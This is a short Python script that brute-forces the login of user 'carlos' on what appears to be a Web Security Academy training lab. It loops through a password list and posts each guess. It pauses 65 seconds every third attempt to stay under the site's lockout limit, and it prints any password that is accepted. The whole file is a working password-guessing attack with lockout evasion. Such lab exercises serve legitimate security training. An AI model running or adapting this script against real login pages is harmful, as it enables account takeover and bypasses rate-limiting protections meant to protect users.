import requests
import sys
import time


def check_password(url, username, password):

    data = {
        "username":username,
        "password":password,
    }

    response = requests.post(url, json=data)
    c = response.content.decode()

    assert 'You have made too many incorrect login attempts.' not in c
    return "Invalid username or password." not in c


def main():

    login_url = 'https://acf11f151fbc6d46c0c4789700d90060.web-security-academy.net/login'
    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]
    user = "carlos"

    for index, password in enumerate(passwords):

        sleep = 65
        if index % 3 == 0:
            print(f"Sleeping for {sleep} seconds")
            time.sleep(sleep)

        print(f"[+] Trying credentials: {user}:{password}")
        if check_password(login_url, user, password):

            print(f"[+] Found password for user '{user}': '{password}'")


if __name__ == '__main__':
    main()
